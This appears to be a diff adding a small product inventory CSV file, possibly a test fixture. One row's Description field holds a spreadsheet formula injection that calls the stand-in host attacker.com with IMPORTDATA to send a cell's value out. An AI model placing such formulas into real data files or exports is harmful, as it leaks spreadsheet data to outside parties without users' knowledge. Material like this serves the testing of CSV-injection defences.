@@ -1,0 +1,5 @@
+SKU,ProductName,Quantity,Description
+WG-001,Widget Alpha,150,Standard widget
+GD-001,Gadget Pro,75,Professional model
+WG-002,Widget Beta,200,"=IMPORTDATA(CONCATENATE(""http://attacker.com/ping?sku="",A3))"
+GD-002,Gadget Lite,300,Basic model
